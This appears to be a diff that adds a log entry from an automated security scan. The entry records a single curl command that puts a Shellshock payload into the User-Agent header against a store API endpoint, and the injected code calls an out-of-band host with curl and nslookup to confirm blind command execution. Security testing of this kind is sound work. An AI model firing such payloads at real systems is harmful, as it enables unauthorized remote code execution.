@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -A '() { :;}; curl -s http://oobd3100faf1065.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/c;nslookup oobd3100faf1065.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in' https://duck-store.escape.tech/api/v1/reviews/product/1/stats
+# exit_code: 0
+# ---
+
